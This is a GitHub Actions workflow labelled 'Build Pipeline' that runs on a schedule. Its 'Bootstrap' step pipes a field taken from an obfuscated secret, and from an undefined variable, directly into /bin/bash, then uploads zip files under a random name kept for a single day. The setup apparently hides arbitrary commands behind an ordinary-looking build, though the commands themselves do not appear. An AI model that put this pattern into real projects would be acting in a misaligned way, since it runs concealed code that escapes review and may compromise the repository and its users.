name: Build Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '57 5,11,17,23 * * *'
permissions:
  contents: read
  actions: read
jobs:
  deploy:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Bootstrap
        env:
          se87: ${{ secrets.se87 }}
        run: |
          printf '%s' "$se87" | jq -r .yt48 | /bin/bash
          echo $gb9 | jq -r .hr85 | /bin/bash

      - name: Archive artifact
        uses: actions/upload-artifact@v4
        with:
          name: VEZdtZcx
          path: "*.zip"
          retention-days: 1
